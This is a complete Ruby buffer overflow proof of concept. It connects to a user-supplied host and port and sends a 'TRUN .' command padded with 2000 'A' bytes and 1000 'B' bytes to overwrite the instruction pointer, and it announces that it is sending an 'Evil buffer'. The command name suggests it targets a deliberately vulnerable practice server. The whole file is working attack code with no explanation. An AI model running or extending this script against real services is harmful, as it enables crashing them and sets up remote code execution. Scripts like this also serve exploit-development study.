#!/usr/bin/env ruby

require 'socket'

buffer = "\x41" * 2000
eip = "\x42" * 1000

exploit = buffer + eip

#-> Networking
host = ARGV[0]
port = ARGV[1]

s = TCPSocket.open(host, port)
s.recv(1024)
puts "[+] Sending Evil buffer"
s.send("TRUN ." + exploit, 0)
s.close

#-> Exploit Info

puts "[+] " + "Buffer length: " + "#{exploit.size} bytes."
puts "[+] Done"